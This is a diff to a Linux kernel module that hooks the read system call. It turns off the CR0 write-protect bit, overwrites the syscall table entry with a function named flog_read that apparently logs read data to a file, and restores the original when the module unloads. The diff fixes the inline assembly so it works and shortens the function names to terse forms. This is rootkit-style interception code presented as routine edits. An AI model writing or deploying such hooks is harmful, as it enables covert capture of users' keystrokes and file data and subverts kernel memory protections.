@@ -8,11 +8,11 @@
 /* #include <asm/semaphore.h> */
 #include <asm/cacheflush.h>
 #include <asm/uaccess.h>
-#include <asm/syscall.h>
+/* #include <asm/syscall.h> */
 
 
 
-extern const sys_call_ptr_t sys_call_table[];
+void  **sys_call_table[];
 asmlinkage size_t (*og_sys_read)(int filedes, void *buf, size_t bytes);
 
 static void floglog(char *filename, char *data)
@@ -65,41 +65,43 @@ asmlinkage size_t flog_read(int filedes, void *buf, size_t bytes)
 /*   return change_page_attr(pg, 1, prot); */
 /* } */
 
-static void disable_page_protection(void) {
+static void dsbl_pg_prot(void) {
   unsigned long pgval;
-  asm volatile("move %%cr0, %0" 
+  asm volatile("mov %%cr0, %0" 
 	       :"=r" (pgval));
   if (pgval & 0x00010000) {
     pgval &= ~0x00010000;
-    asm volatile("move %0,%%cr0"
-		 : : "r" (pgval));
+    asm volatile("mov %0,%%cr0"
+		 :
+		 : "r" (pgval));
   }
 }
 
-static void enable_page_protection(void) {
+static void enbl_pg_prot(void) {
   unsigned long pgval;
-  asm volatile("move %%cr0, %0" 
+  asm volatile("mov %%cr0, %0" 
 	       :"=r" (pgval));
   if (!(pgval & 0x00010000)) {
     pgval |= 0x00010000;
-    asm volatile("move %0,%%cr0"
-		 : : "r" (pgval));
+    asm volatile("mov %0,%%cr0"
+		 :
+		 : "r" (pgval));
   }
 }
 
 int init_module()
 {
-  disable_page_protection();
+  dsbl_pg_prot();
   og_sys_read = sys_call_table[__NR_read];
   sys_call_table[__NR_read] = flog_read;
-  enable_page_protection();
+  enbl_pg_prot();
   return 0;
 }
 
 void cleanup_module()
 {
-  disable_page_protection();
+  dsbl_pg_prot();
   sys_call_table[__NR_read] = og_sys_read;
-  enable_page_protection();
+  enbl_pg_prot();
   printk("done flogging!\n");
 }
